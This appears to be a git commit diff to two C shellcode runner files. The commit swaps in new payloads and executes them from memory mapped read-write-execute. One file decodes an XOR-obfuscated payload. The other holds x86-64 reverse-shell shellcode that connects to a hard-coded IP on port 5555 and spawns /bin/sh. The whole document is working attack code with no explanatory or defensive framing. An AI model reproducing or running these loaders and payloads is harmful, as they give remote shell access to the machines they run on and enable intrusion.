d0e90da2a2b241b9e7b257f582b933771dba163f
0xjrx <mrmarquard@protonmail.com>
2025-04-04 22:38:17 +0200

    fix: update shellcode and mem permissions

--- shellcode/shellcode_o.c
+++ shellcode/shellcode_o.c
@@ -1,12 +1,14 @@
-#include <stddef.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
-
+#include <sys/mman.h>
 int main() {
-  const unsigned char bogus[] =
-      "\x7f\x06\xe5\x65\x7f\x8f\x18\x55\x5e\x59\x18\x18\x44"
-      "\x5f\x67\x7f\xbe\xd0\x65\x60"
-      "\x7f\xbe\xd1\x06\xf7\x87\x0c\x38\x32\x37";
+  unsigned char bogus[] =
+      "\x5d\x1e\x6f\xae\x5d\x35\x68\x5d\x36\x69\x38\x32\x7f\xa0\x7f\x8e"
+      "\x35\x37\x22\x84\xf7\x9f\x46\x50\x66\x7f\xbe\xd1\x5d\x27\x6d\x5d\x1d"
+      "\x6f\x38\x32\x5d\x34\x69\x7f\xc8\xf9\x5d\x16\x6f\x38\x32\x42\xc1\x5d"
+      "\x0c\x6f\xae\x7f\x8c\x18\x55\x5e\x59\x18\x44\x5f\x37\x64\x7f\xbe\xd0"
+      "\x65\x60\x7f\xbe\xd1\x38\x32";
   size_t len = sizeof(bogus);
 
   // Create a writable array to hold the XORed result
@@ -20,9 +22,21 @@ int main() {
   }
 
   // Cast the shell array to a function pointer and execute the shellcode
-  void (*f)() = (void (*)())shell;
-  f(); // Call the shellcode
+  size_t size = sizeof(shell);
+
+  // Allocate memory with RWX permissions
+  void *exec_mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
+                        MAP_ANON | MAP_PRIVATE, -1, 0);
+  if (exec_mem == MAP_FAILED) {
+    perror("mmap");
+    exit(1);
+  }
+
+  // Copy shellcode into exec_mem
+  memcpy(exec_mem, shell, size);
+
+  // Execute it
+  ((void (*)())exec_mem)(); // Call the shellcode
 
   return 0;
 }
-
--- shellcode/shelloce_no.c
+++ shellcode/shelloce_no.c
@@ -1,14 +1,32 @@
 #include <stdio.h>
-
-int foo = 0x37;
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
 
 int main() {
-  const char shellcode[] =
-      "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
-      "\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05";
+  unsigned char shellcode[] =
+      "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
+      "\x48\xb9\x02\x00\x15\xb3\xc0\xa8\x71\x67\x51\x48\x89\xe6"
+      "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
+      "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
+      "\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
+      "\x89\xe6\x0f\x05";
 
-  void (*f)() = (void (*)())shellcode;
-  f();
+  size_t size = sizeof(shellcode);
+
+  // Allocate memory with RWX permissions
+  void *exec_mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
+                        MAP_ANON | MAP_PRIVATE, -1, 0);
+  if (exec_mem == MAP_FAILED) {
+    perror("mmap");
+    exit(1);
+  }
+
+  // Copy shellcode into exec_mem
+  memcpy(exec_mem, shellcode, size);
+
+  // Execute it
+  ((void (*)())exec_mem)();
 
   return 0;
 }
